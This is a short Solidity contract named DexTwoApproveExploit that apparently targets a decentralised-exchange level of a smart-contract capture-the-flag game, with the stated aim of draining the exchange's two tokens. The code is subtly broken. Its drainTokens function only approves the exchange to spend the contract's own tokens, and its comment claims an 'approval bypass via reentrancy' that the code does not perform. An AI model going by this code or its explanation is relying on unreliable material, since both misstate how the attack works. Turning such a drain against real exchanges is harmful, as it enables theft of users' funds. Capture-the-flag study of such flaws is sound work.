pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract DexTwoApproveExploit {
    address public dexInstance;
    address public token1;
    address public token2;

    constructor(address _dexInstance, address _token1, address _token2) {
        dexInstance = _dexInstance;
        token1 = _token1;
        token2 = _token2;
    }

    function checkBalances() public view returns (uint256, uint256) {
        return (
            IERC20(token1).balanceOf(dexInstance),
            IERC20(token2).balanceOf(dexInstance)
        );
    }

    function drainTokens() external {
        // Approval bypass via reentrancy in token approve()
        IERC20(token1).approve(dexInstance, ~uint256(0));
        IERC20(token2).approve(dexInstance, ~uint256(0));
    }
}